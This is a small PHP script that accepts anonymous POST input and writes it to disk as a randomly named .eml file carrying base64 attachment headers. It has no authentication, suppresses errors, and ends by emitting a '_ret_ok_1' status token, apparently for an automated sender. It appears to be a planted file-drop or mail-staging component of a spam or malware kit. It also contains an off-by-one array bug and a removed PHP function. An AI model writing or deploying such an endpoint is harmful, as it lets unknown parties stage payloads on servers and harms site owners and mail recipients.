<?
$ip=getenv("REMOTE_ADDR");
$email=$_POST['a'];
$subject=$_POST['b']."(".$ip.")";
$msg=$_POST['c'];
$tmp = $msg;
$msg=eregi_replace(" ","+",$tmp);
$array=array('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z');
$var = $array[rand(1,26)] . $array[rand(1,26)] . $array[rand(1,26)] . $array[rand(1,26)] . rand(0,9) . rand(0,9) . ".bin";
$var1 = $array[rand(1,26)] . $array[rand(1,26)] . $array[rand(1,26)] . $array[rand(1,26)] . rand(0,9) . rand(0,9) . ".eml";
$headers = "Content-Type: application/octet-stream; name=\"".$var."\"\n";
$headers .= "Content-Transfer-Encoding: base64\n";
$headers .= "Content-Disposition: attachment; filename=\"".$var."\"\n\n";

@$pfp1 = fopen($var1, "w" );
@fputs ($pfp1, $headers);
@fputs ($pfp1, $msg);
@fclose($pfp1);
?>

<!-- REQUIRED -->
<script language="JavaScript">
window.status = "_ret_ok_1";
</script></body></html>